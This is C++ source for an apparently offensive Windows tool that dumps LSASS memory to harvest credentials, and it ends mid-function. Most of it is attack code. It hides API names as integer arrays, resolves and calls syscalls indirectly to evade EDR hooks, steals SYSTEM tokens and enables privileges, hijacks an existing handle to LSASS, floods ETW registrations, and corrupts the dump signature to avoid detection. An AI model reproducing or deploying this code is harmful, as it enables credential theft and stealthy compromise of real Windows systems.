#include "headers/includes.h"

#define WIN32_LEAN_AND_MEAN
#define IsProcessSnapshotCallback 16
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)
#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_SUCCESS 0x00000000
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define STATUS_BUFFER_TOO_SMALL 0xC0000023
#define STATUS_ACCESS_DENIED 0xC0000022
#define STATUS_NOT_SUPPORTED 0xC00000BB

typedef LONG NTSTATUS;

std::vector<SYSCALL_ENTRY> syscallTable;

SIZE_T dumpBufferSize;
LPVOID dumpBuffer;
DWORD bytesRead = 0;


constexpr int ISQtN[] = { 81, 117, 101, 114, 121, 83, 121, 115, 116, 101, 109, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110};
constexpr int TPOtN[] = { 79, 112, 101, 110, 80, 114, 111, 99, 101, 115, 115, 84, 111, 107, 101, 110 };
constexpr int TPAtN[] = { 65, 100, 106, 117, 115, 116, 80, 114, 105, 118, 105, 108, 101, 103, 101, 115, 84, 111, 107, 101, 110 };
constexpr int CtN[] = { 67, 108, 111, 115, 101 };
constexpr int TIQtN[] = { 81, 117, 101, 114, 121, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 84, 111, 107, 101, 110 };
constexpr int POtN[] = { 79, 112, 101, 110, 80, 114, 111, 99, 101, 115, 115 };
constexpr int TDtN[] = { 68, 117, 112, 108, 105, 99, 97, 116, 101, 84, 111, 107, 101, 110 };
constexpr int ODtN[] = { 68, 117, 112, 108, 105, 99, 97, 116, 101, 79, 98, 106, 101, 99, 116 };
constexpr int OQtN[] = { 81, 117, 101, 114, 121, 79, 98, 106, 101, 99, 116 };
constexpr int TIStN[] = { 83, 101, 116, 73, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110, 84, 104, 114, 101, 97, 100 };

BOOL CALLBACK minidumpCallback(
    IN PVOID callbackParam,
    IN const PMINIDUMP_CALLBACK_INPUT callbackInput,
    IN OUT PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
    LPVOID destination = 0, source = 0;
    DWORD bufferSize = 0;

    switch (callbackInput->CallbackType)
    {
    case IsProcessSnapshotCallback:
        callbackOutput->Status = S_FALSE;
        break;

    case IoStartCallback:
        callbackOutput->Status = S_FALSE;
        break;

    case IoWriteAllCallback:
        callbackOutput->Status = S_OK;

        source = callbackInput->Io.Buffer;
        destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);

        bufferSize = callbackInput->Io.BufferBytes;
        bytesRead += bufferSize;

        if ((bytesRead <= dumpBufferSize) && (destination != NULL)) {
            RtlCopyMemory(destination, source, bufferSize);
        }
        else {
            callbackOutput->Status = S_FALSE;
        }

        break;

    case IoFinishCallback:
        callbackOutput->Status = S_OK;
        break;

    default:
        return TRUE;
    }
    return TRUE;
}

void RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    if (SourceString == nullptr) {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
        DestinationString->Buffer = nullptr;
    }
    else {
        size_t size = wcslen(SourceString) * sizeof(WCHAR);
        DestinationString->Length = static_cast<USHORT>(size);
        DestinationString->MaximumLength = static_cast<USHORT>(size + sizeof(WCHAR));
        DestinationString->Buffer = const_cast<PWSTR>(SourceString);
    }
}

void InitializeObjectAttributes(
    POBJECT_ATTRIBUTES p,
    PUNICODE_STRING n,
    ULONG a,
    HANDLE r,
    PVOID s
) {
    p->Length = sizeof(OBJECT_ATTRIBUTES);
    p->RootDirectory = r;
    p->Attributes = a;
    p->ObjectName = n;
    p->SecurityDescriptor = s;
    p->SecurityQualityOfService = nullptr;
}

std::wstring GetLastErrorMessage() {
    DWORD errorCode = GetLastError();
    LPWSTR errorMessage = nullptr;

    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        nullptr, errorCode, 0,
        reinterpret_cast<LPWSTR>(&errorMessage), 0, nullptr);

    if (errorMessage != nullptr) {
        std::wstring errorMsg(errorMessage);
        LocalFree(errorMessage);
        return errorMsg;
    }
    else {
        return L"Failed to retrieve error message.";
    }
}

template<typename StringType, size_t N>
StringType unASCIIme(const int(&ascii_values)[N]) {
    StringType result;
    result += static_cast<typename StringType::value_type>(78);
    result += static_cast<typename StringType::value_type>(116);
    for (size_t i = 0; i < N; ++i)
        result += static_cast<typename StringType::value_type>(ascii_values[i]);
    return result;
}

constexpr unsigned int numRNG() {
    const char* timeStr = __TIME__;
    unsigned int hash = '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;

    for (int i = 0; timeStr[i] != '\0'; ++i)
        hash = 31 * hash + timeStr[i];
    return hash;
}

constexpr unsigned long DJB2me(const char* str) {
    unsigned long hash = numRNG();
    while (int c = *str++) {
        hash = ((hash << 7) + hash) + c;
    }
    return hash;
}

PPEB GetPEB() {
    DWORD64 offset1 = 0x30;
    DWORD64 offset2 = 0x20;
    DWORD64 offset3 = 0x10;

    PPEB peb = reinterpret_cast<PPEB>(__readgsqword(offset1 + offset2 + offset3));
    return peb;
}

PVOID GetModuleBaseAddress(const wchar_t* moduleName) {
    PPEB peb = GetPEB();
    PLIST_ENTRY moduleList = &peb->Ldr->InLoadOrderModuleList;

    for (PLIST_ENTRY entry = moduleList->Flink; entry != moduleList; entry = entry->Flink) {
        PLDR_DATA_TABLE_ENTRY module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (wcscmp(module->BaseDllName.Buffer, moduleName) == 0) {
            return module->DllBase;
        }
    }
    return nullptr;
}

int Partition(std::vector<SYSCALL_ENTRY>& arr, int low, int high) {
    auto pivot = arr[high];
    int i = (low - 1);

    for (int j = low; j < high; j++) {
        if (arr[j].Address < pivot.Address) {
            i++;
            std::swap(arr[i], arr[j]);
        }
    }
    std::swap(arr[i + 1], arr[high]);
    return (i + 1);
}

void QuickSort(std::vector<SYSCALL_ENTRY>& arr, int low, int high) {
    if (low < high) {
        int pi = Partition(arr, low, high);

        QuickSort(arr, low, pi - 1);
        QuickSort(arr, pi + 1, high);
    }
}

void ParseEAT() {
    const wchar_t lldlldtn[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
    HMODULE hNtdll = reinterpret_cast<HMODULE>(GetModuleBaseAddress((LPCWSTR)lldlldtn));
    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hNtdll);
    PIMAGE_NT_HEADERS pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(hNtdll) + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(reinterpret_cast<BYTE*>(hNtdll) + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD pFunctions = reinterpret_cast<PDWORD>(reinterpret_cast<BYTE*>(hNtdll) + pExportDir->AddressOfFunctions);
    PDWORD pNames = reinterpret_cast<PDWORD>(reinterpret_cast<BYTE*>(hNtdll) + pExportDir->AddressOfNames);
    PWORD pNameOrdinals = reinterpret_cast<PWORD>(reinterpret_cast<BYTE*>(hNtdll) + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        PCHAR pFunctionName = reinterpret_cast<PCHAR>(reinterpret_cast<BYTE*>(hNtdll) + pNames[i]);
        if (strncmp(pFunctionName, "Zw", 2) == 0) {
            SYSCALL_ENTRY entry;
            DWORD functionRVA = pFunctions[pNameOrdinals[i]];
            entry.Address = reinterpret_cast<PVOID>(reinterpret_cast<BYTE*>(hNtdll) + functionRVA);
            entry.Hash = DJB2me(("Nt" + std::string(pFunctionName + 2)).c_str());
            syscallTable.push_back(entry);
        }
    }

    QuickSort(syscallTable, 0, syscallTable.size() - 1);

    for (SIZE_T i = 0; i < syscallTable.size(); i++)
        syscallTable[i].Address = EncodePointer(syscallTable[i].Address);
}

template<typename ReturnType>
ReturnType GetVal(std::string funcName) {
    for (SIZE_T i = 0; i < syscallTable.size(); ++i)
        if (syscallTable[i].Hash == DJB2me(funcName.c_str()))
            if constexpr (std::is_same_v<ReturnType, int>) return static_cast<ReturnType>(i);
            else if constexpr (std::is_same_v<ReturnType, PVOID>) return DecodePointer(syscallTable[i].Address);
            else static_assert(std::is_same_v<ReturnType, int> || std::is_same_v<ReturnType, PVOID>, "Invalid Type");
    return ReturnType{ 0 };
}

uintptr_t GetOffset(std::string funcName) noexcept {
    INT64 offset = 0;
    BYTE signature[] = { 0x0F, 0x05, 0xC3 };

    uintptr_t pFunc = reinterpret_cast<uintptr_t>(GetVal<PVOID>(funcName));
    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(pFunc);
    PIMAGE_NT_HEADERS pNtHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(pFunc) + pDosHeader->e_lfanew);
    INT64 pSize = (pNtHeaders->OptionalHeader.SizeOfImage);
    BYTE* currentbytes = (BYTE*)pFunc;

    for (;;)
    {
        if (*(reinterpret_cast<BYTE*>(currentbytes)) == signature[0] &&
            *(reinterpret_cast<BYTE*>(currentbytes + 1)) == signature[1] &&
            *(reinterpret_cast<BYTE*>(currentbytes + 2)) == signature[2])
        {
            return pFunc + offset;
        }
        offset++;
        if (offset + 3 > pSize)
            return INFINITE;
        currentbytes = reinterpret_cast<BYTE*>(pFunc + offset);
    }
}

void Gluttony() {
    DWORD status = ERROR_SUCCESS;
    REGHANDLE RegistrationHandle = NULL;
    const GUID ProviderGuid = { 0x230d3ce1, 0xbccc, 0x124e, {0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4} };
    int count = 0;
    while (status = EventRegister(&ProviderGuid, NULL, NULL, &RegistrationHandle) == ERROR_SUCCESS) {
        count++;
    }
    printf("%d\n", count);
}


BOOL YouMustBeThisTallToRide() {
    BOOL fIsElevated = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (hToken) CloseHandle(hToken);
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
        if (hToken) CloseHandle(hToken);
        return FALSE;
    }

    fIsElevated = elevation.TokenIsElevated;
}

BOOL GetPromoted(HANDLE hToken) {
    const uintptr_t jmpNtDT = GetOffset(unASCIIme<std::string>(TDtN));
    const uintptr_t jmpNtSIT = GetOffset(unASCIIme<std::string>(TIStN));
    const int NtDT = GetVal<int>(unASCIIme<std::string>(TDtN));
    const int NtSIT = GetVal<int>(unASCIIme<std::string>(TIStN));

    HANDLE hCurrent = NtCurrentThread();
    HANDLE hDuplicate = nullptr;
    NTSTATUS status = STATUS_SUCCESS;

    OBJECT_ATTRIBUTES ObjectAttributes;
    InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);

    SECURITY_QUALITY_OF_SERVICE Qos;
    Qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
    Qos.ImpersonationLevel = SecurityImpersonation;
    Qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
    Qos.EffectiveOnly = FALSE;

    ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    ObjectAttributes.RootDirectory = NULL;
    ObjectAttributes.ObjectName = NULL;
    ObjectAttributes.Attributes = 0;
    ObjectAttributes.SecurityDescriptor = NULL;
    ObjectAttributes.SecurityQualityOfService = &Qos;

    SetJumpAddress(jmpNtDT);
    status = NtDuplicateToken(hToken, TOKEN_ALL_ACCESS, &ObjectAttributes, FALSE, TokenImpersonation, &hDuplicate, NtDT);

    SetJumpAddress(jmpNtSIT);
    status = NtSetInformationThread(hCurrent, ThreadImpersonationToken, &hDuplicate, sizeof(HANDLE), NtSIT);

    return NT_SUCCESS(status);
}

BOOL GetDemoted() {
    const uintptr_t jmpNtSIT = GetOffset(unASCIIme<std::string>(TIStN));
    const int NtSIT = GetVal<int>(unASCIIme<std::string>(TIStN));

    HANDLE hCurrent = NtCurrentThread();
    HANDLE hNull = nullptr;
    NTSTATUS status = STATUS_SUCCESS;

    SetJumpAddress(jmpNtSIT);
    status = NtSetInformationThread(hCurrent, ThreadImpersonationToken, &hNull, sizeof(HANDLE), NtSIT);

    return NT_SUCCESS(status);
}

BOOL LetMeDoStuff(HANDLE hToken, LUID luid, BOOL bLetMeDoTheThing) {
    NTSTATUS status = STATUS_SUCCESS;
    TOKEN_PRIVILEGES priv = { 0 };

    const uintptr_t jmpNtAPT = GetOffset(unASCIIme<std::string>(TPAtN));
    const uintptr_t jmpNtC = GetOffset(unASCIIme<std::string>(CtN));
    const int NtAPT = GetVal<int>(unASCIIme<std::string>(TPAtN));
    const int NtC = GetVal<int>(unASCIIme<std::string>(CtN));

    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = bLetMeDoTheThing ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;

    SetJumpAddress(jmpNtAPT);
    status = NtAdjustPrivilegesToken(hToken, FALSE, &priv, 0, NULL, NULL, NtAPT);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }
    return TRUE;
}

PSYSTEM_PROCESS_INFORMATION GetSysProcInfo() {
    NTSTATUS status = STATUS_SUCCESS;
    PVOID buffer = nullptr;
    ULONG bufferSize = 0;

    const uintptr_t jmpNtQSI = GetOffset(unASCIIme<std::string>(ISQtN));
    const int NtQSI = GetVal<int>(unASCIIme<std::string>(ISQtN));

    SetJumpAddress(jmpNtQSI);
    status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize, NtQSI);

    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        if (buffer) free(buffer);
        buffer = malloc(bufferSize);
        if (!buffer) {
            return nullptr;
        }
        SetJumpAddress(jmpNtQSI);
        status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &bufferSize, NtQSI);
    }

    if (!NT_SUCCESS(status)) {
        if (buffer) free(buffer);
        return nullptr;
    }

    return (PSYSTEM_PROCESS_INFORMATION)buffer;
}

DWORD WeHaveTheChatLogsHere(void) {
    EVT_HANDLE hResults = NULL, hContext = NULL, hEvent = NULL;
    DWORD dwProcessId = 0;

    do {
        hResults = EvtQuery(NULL, L"Security", L"*[System[EventID=4608]]", EvtQueryChannelPath | EvtQueryTolerateQueryErrors);
        if (!hResults) {
            wprintf(L"EvtQuery failed: %s\n", GetLastErrorMessage());
            break;
        }

        if (!EvtSeek(hResults, 0, NULL, 0, EvtSeekRelativeToLast)) {
            wprintf(L"EvtSeek failed: %s\n", GetLastErrorMessage());
            break;
        }

        DWORD dwReturned = 0;
        if (!EvtNext(hResults, 1, &hEvent, INFINITE, 0, &dwReturned) || dwReturned != 1) {
            wprintf(L"EvtNext failed: %s\n", GetLastErrorMessage());
            break;
        }

        LPCWSTR ppValues[] = { L"Event/System/Execution/@ProcessID" };
        hContext = EvtCreateRenderContext(1, ppValues, EvtRenderContextValues);
        if (!hContext) {
            wprintf(L"EvtCreateRenderContext failed: %s\n", GetLastErrorMessage());
            break;
        }

        EVT_VARIANT pProcessId = { 0 };
        if (!EvtRender(hContext, hEvent, EvtRenderEventValues, sizeof(EVT_VARIANT), &pProcessId, &dwReturned, NULL)) {
            wprintf(L"EvtRender failed: %s\n", GetLastErrorMessage());
            break;
        }

        dwProcessId = pProcessId.UInt32Val;
    } while (FALSE);

    if (hEvent) EvtClose(hEvent);
    if (hContext) EvtClose(hContext);
    if (hResults) EvtClose(hResults);

    return dwProcessId;
}

BOOL IsSystemProcess(HANDLE hToken) {
    BOOL isSystem = FALSE;
    NTSTATUS status = STATUS_SUCCESS;
    PTOKEN_USER pTokenUser = nullptr;
    ULONG pTokenUserSize = sizeof(PTOKEN_USER);
    pTokenUser = (PTOKEN_USER)malloc(pTokenUserSize);

    const uintptr_t jmpNtQIT = GetOffset(unASCIIme<std::string>(TIQtN));
    const int NtQIT = GetVal<int>(unASCIIme<std::string>(TIQtN));

    SetJumpAddress(jmpNtQIT);
    status = NtQueryInformationToken(hToken, TokenUser, pTokenUser, pTokenUserSize, &pTokenUserSize, NtQIT);

    while (status == STATUS_BUFFER_TOO_SMALL || status == STATUS_INFO_LENGTH_MISMATCH) {
        if (pTokenUser) free(pTokenUser);
        pTokenUser = (PTOKEN_USER)malloc(pTokenUserSize);
        if (!pTokenUser) {
            return FALSE;
        }
        SetJumpAddress(jmpNtQIT);
        status = NtQueryInformationToken(hToken, TokenUser, pTokenUser, pTokenUserSize, &pTokenUserSize, NtQIT);
    }

    if (!NT_SUCCESS(status)) {
        if (pTokenUser) free(pTokenUser);
        return FALSE;
    }

    PSID pSystemSid;
    ConvertStringSidToSid(L"S-1-5-18", &pSystemSid);
    isSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);
    free(pTokenUser);
    LocalFree(pSystemSid);

    return isSystem;
}

HANDLE FindersKeepers(LUID luid = { 0,0 }) {
    PSYSTEM_PROCESS_INFORMATION sysProcInfo = GetSysProcInfo();
    std::wstring blacklist[] = { L"winlogon.exe", L"csrss.exe", L"svchost.exe", L"lsass.exe", L"spoolsv.exe" , L"LsaIso.exe" };
    int blacklistSize = sizeof(blacklist) / sizeof(*blacklist);
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE hProcess = nullptr;
    HANDLE hToken = nullptr;
    HANDLE hDuplicate = nullptr;

    const uintptr_t jmpNtOP = GetOffset(unASCIIme<std::string>(POtN));
    const uintptr_t jmpNtOPT = GetOffset(unASCIIme<std::string>(TPOtN));
    const uintptr_t jmpNtDT = GetOffset(unASCIIme<std::string>(TDtN));
    const uintptr_t jmpNtC = GetOffset(unASCIIme<std::string>(CtN));
    const int NtOP = GetVal<int>(unASCIIme<std::string>(POtN));
    const int NtOPT = GetVal<int>(unASCIIme<std::string>(TPOtN));
    const int NtDT = GetVal<int>(unASCIIme<std::string>(TDtN));
    const int NtC = GetVal<int>(unASCIIme<std::string>(CtN));

    HANDLE hCurrent = nullptr;
    SetJumpAddress(jmpNtOPT);
    status = NtOpenProcessToken(NtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrent, NtOPT);
    if (!NT_SUCCESS(status))
        if (status == STATUS_ACCESS_DENIED) {
            sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
            return hCurrent;
        }

    LetMeDoStuff(hCurrent, luid, TRUE);
    SetJumpAddress(jmpNtC);
    NtClose(hCurrent, NtC);

    do {
        if (sysProcInfo->ImageName.Length) {
            BOOL isBlacklisted = std::find(blacklist, blacklist + blacklistSize, sysProcInfo->ImageName.Buffer) != blacklist + blacklistSize;
            if (!isBlacklisted) {
                CLIENT_ID clientId = { (HANDLE)sysProcInfo->UniqueProcessId, 0 };
                OBJECT_ATTRIBUTES objAttr;
                InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

                SECURITY_QUALITY_OF_SERVICE Qos;
                Qos.Length = sizeof(SECURITY_QUALITY_OF_SERVICE);
                Qos.ImpersonationLevel = SecurityImpersonation;
                Qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;
                Qos.EffectiveOnly = FALSE;

                objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
                objAttr.RootDirectory = NULL;
                objAttr.ObjectName = NULL;
                objAttr.Attributes = 0;
                objAttr.SecurityDescriptor = NULL;
                objAttr.SecurityQualityOfService = &Qos;

                SetJumpAddress(jmpNtOP);
                status = NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION, &objAttr, &clientId, NtOP);
                if (!NT_SUCCESS(status))
                    if (status == STATUS_ACCESS_DENIED) {
                        sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
                        continue;
                    }

                SetJumpAddress(jmpNtOPT);
                status = NtOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken, NtOPT);
                if (!NT_SUCCESS(status))
                    if (status == STATUS_ACCESS_DENIED) {
                        sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
                        continue;
                    }

                if (IsSystemProcess(hToken)) {
                    SetJumpAddress(jmpNtDT);
                    status = NtDuplicateToken(hToken, TOKEN_ALL_ACCESS, &objAttr, FALSE, TokenPrimary, &hDuplicate, NtDT);
                    if (!NT_SUCCESS(status))
                        if (status == STATUS_ACCESS_DENIED) {
                            sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
                            continue;
                        }

                    SetJumpAddress(jmpNtC);
                    NtClose(hProcess, NtC);
                    NtClose(hToken, NtC);
                    return hDuplicate;
                }
                else {
                    SetJumpAddress(jmpNtC);
                    NtClose(hProcess, NtC);
                    NtClose(hToken, NtC);
                }
            }
        }
            
        sysProcInfo = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)sysProcInfo) + sysProcInfo->NextEntryOffset);
    } while (sysProcInfo->NextEntryOffset != 0);

    exit(status);
}

SIZE_T FindBufferSize(HANDLE hProcess) {
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T totalMemory = 0;
    BYTE* p = 0;

    while (VirtualQueryEx(hProcess, p, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT && (
            mbi.Protect == PAGE_READONLY ||
            mbi.Protect == PAGE_READWRITE ||
            mbi.Protect == PAGE_EXECUTE_READ ||
            mbi.Protect == PAGE_EXECUTE_READWRITE ||
            mbi.Protect == PAGE_WRITECOPY ||
            mbi.Protect == PAGE_EXECUTE_WRITECOPY ||
            mbi.Protect == PAGE_EXECUTE) &&
            !(mbi.Protect & PAGE_GUARD) &&
            !(mbi.Protect & PAGE_NOACCESS))
        {
            totalMemory += mbi.RegionSize;
        }
        p += mbi.RegionSize;
    }

    SIZE_T estimatedOverhead = totalMemory * 0.2;
    return totalMemory + estimatedOverhead;
}

HANDLE HijackHandle(std::string procName) {
    std::wstring wsProcName = std::wstring(procName.begin(), procName.end());
    HANDLE hProcess = nullptr;
    HANDLE hDuplicate = nullptr;
    NTSTATUS status = STATUS_SUCCESS;

    int howManyOpenProcessCalls = 0;
    int howManyNonProcessHandles = 0;

    ULONG handleTableInformationSize = sizeof(PSYSTEM_HANDLE_INFORMATION);
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInformationSize));

    const uintptr_t jmpNtQSI = GetOffset(unASCIIme<std::string>(ISQtN));
    const uintptr_t jmpNtOP = GetOffset(unASCIIme<std::string>(POtN));
    const uintptr_t jmpNtDO = GetOffset(unASCIIme<std::string>(ODtN));
    const uintptr_t jmpNtQO = GetOffset(unASCIIme<std::string>(OQtN));
    const uintptr_t jmpNtC = GetOffset(unASCIIme<std::string>(CtN));
    const int NtQSI = GetVal<int>(unASCIIme<std::string>(ISQtN));
    const int NtOP = GetVal<int>(unASCIIme<std::string>(POtN));
    const int NtDO = GetVal<int>(unASCIIme<std::string>(ODtN));
    const int NtQO = GetVal<int>(unASCIIme<std::string>(OQtN));
    const int NtC = GetVal<int>(unASCIIme<std::string>(CtN));

    SetJumpAddress(jmpNtQSI);
    status = NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, handleTableInformationSize, &handleTableInformationSize, NtQSI);

    while (status == STATUS_INFO_LENGTH_MISMATCH) {
        if (handleTableInformation) HeapFree(handleTableInformation, NULL, NULL);
        handleTableInformation = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, handleTableInformationSize));
        if (!handleTableInformation) {
            return hDuplicate;
        }
        SetJumpAddress(jmpNtQSI);
        status = NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, handleTableInformationSize, &handleTableInformationSize, NtQSI);
    }

    if (!NT_SUCCESS(status)) {
        if (handleTableInformation) HeapFree(handleTableInformation, NULL, NULL);
        return hDuplicate;
    }

    DWORD pid = WeHaveTheChatLogsHere();

    for (int i = 0; i < handleTableInformation->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = static_cast<SYSTEM_HANDLE_TABLE_ENTRY_INFO>(handleTableInformation->Handles[i]);

        if (!handleInfo.UniqueProcessId == pid || handleInfo.GrantedAccess < PROCESS_VM_READ)
            continue;

        OBJECT_ATTRIBUTES objAttr;
        CLIENT_ID clientId;

        InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
        clientId.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(handleInfo.UniqueProcessId));
        clientId.UniqueThread = 0;

        SetJumpAddress(jmpNtOP);
        status = NtOpenProcess(&hProcess, PROCESS_DUP_HANDLE, &objAttr, &clientId, NtOP);
        howManyOpenProcessCalls++;

        if (NT_SUCCESS(status) && hProcess != nullptr) {
            SetJumpAddress(jmpNtDO);
            status = NtDuplicateObject(hProcess, reinterpret_cast<HANDLE>(handleInfo.HandleValue), NtCurrentProcess(), &hDuplicate, PROCESS_ALL_ACCESS, 0, 0, NtDO);

            if (NT_SUCCESS(status) && hDuplicate != nullptr) {
                POBJECT_TYPE_INFORMATION objTypeInfo = NULL;
                ULONG objTypeInfoSize = sizeof(POBJECT_TYPE_INFORMATION);

                objTypeInfo = reinterpret_cast<POBJECT_TYPE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objTypeInfoSize));
                SetJumpAddress(jmpNtQO);
                status = NtQueryObject(hDuplicate, ObjectTypeInformation, objTypeInfo, objTypeInfoSize, &objTypeInfoSize, NtQO);

                while (status == STATUS_INFO_LENGTH_MISMATCH) {
                    if (objTypeInfo) HeapFree(objTypeInfo, NULL, NULL);
                    objTypeInfo = reinterpret_cast<POBJECT_TYPE_INFORMATION>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, objTypeInfoSize));
                    if (!objTypeInfo) {
                        return hDuplicate;
                    }
                    SetJumpAddress(jmpNtQO);
                    status = NtQueryObject(hDuplicate, ObjectTypeInformation, objTypeInfo, objTypeInfoSize, &objTypeInfoSize, NtQO);
                }

                if (!NT_SUCCESS(status)) {
                    if (handleTableInformation) HeapFree(handleTableInformation, NULL, NULL);
                    return hDuplicate;
                }

                if (wcscmp(objTypeInfo->Name.Buffer, L"Process") == 0) {
                    TCHAR buffer[MAX_PATH];
                    DWORD bufferSize = MAX_PATH;

                    if (QueryFullProcessImageName(hDuplicate, 0, buffer, &bufferSize)) {
                        std::wstring processImagePath(buffer);
                        if (processImagePath.rfind(wsProcName) != std::wstring::npos) {
                            SetJumpAddress(jmpNtC);
                            if (hProcess) NtClose(hProcess, NtC);
                            return hDuplicate;
                        }
                    }
                }
                else {
                    howManyNonProcessHandles++;
                    continue;
                }
            }
            else continue;
        }
        else continue;
    }
    SetJumpAddress(jmpNtC);
    if (hProcess) NtClose(hProcess, NtC);
    if (hDuplicate) NtClose(hDuplicate, NtC);
    exit(status);
}

VOID GenerateInvalidSignature(LPVOID dumpBuffer) {
    std::srand(numRNG());
    unsigned char* pBuffer = static_cast<unsigned char*>(dumpBuffer);

    for (int i = 0; i < 8; ++i) {
        pBuffer[i] = static_cast<unsigned char>(std::rand() % 256);
    }
}

BOOL InvokeMiniDump(HANDLE hProcess) {
    BOOL isDumped = FALSE;

    dumpBufferSize = FindBufferSize(hProcess);
    dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dumpBufferSize);

    const wchar_t lldplehgbd[] = { L'D', L'b', L'g', L'h', L'e', L'l', L'p', L'.', L'd', L'l', L'l', L'\0' };
    const char dwdm[] = { 'M', 'i', 'n', 'i', 'D', 'u', 'm', 'p', 'W', 'r', 'i', 't', 'e', 'D', 'u', 'm', 'p', '\0' };

    typedef BOOL(WINAPI* fMiniDumpWriteDump)(
        HANDLE hProcess,
        DWORD ProcessId,
        HANDLE hFile,
        MINIDUMP_TYPE DumpType,
        PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
        PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
        PMINIDUMP_CALLBACK_INFORMATION CallbackParam
        );

    fMiniDumpWriteDump miniDumpWriteDump = (fMiniDumpWriteDump)(GetProcAddress(LoadLibrary(lldplehgbd), dwdm));

    MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
    ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    CallbackInfo.CallbackRoutine = &minidumpCallback;
    CallbackInfo.CallbackParam = NULL;

    HANDLE hSnapshot = nullptr;
